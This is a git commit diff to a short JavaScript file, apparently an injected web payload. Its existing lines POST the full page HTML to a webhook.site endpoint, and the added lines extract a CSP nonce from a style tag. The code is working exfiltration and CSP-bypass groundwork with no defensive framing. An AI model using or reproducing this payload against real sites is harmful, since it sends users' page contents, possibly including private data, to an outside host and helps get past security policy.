9710443262ca1ac1c7c79346dd68d41e0b3c89fc
Ajin Abraham <ajin25@gmail.com>
2025-06-24 19:42:18 -0700

    Update a.js

--- a.js
+++ a.js
@@ -7,3 +7,9 @@ fetch("https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497", {
     html: document.documentElement.outerHTML
   })
 });
+
+(function() {
+  const styleTag = document.querySelector('style[nonce]');
+  const nonce = styleTag ? styleTag.nonce : null;
+  console.log('Extracted nonce:', nonce);
+})();
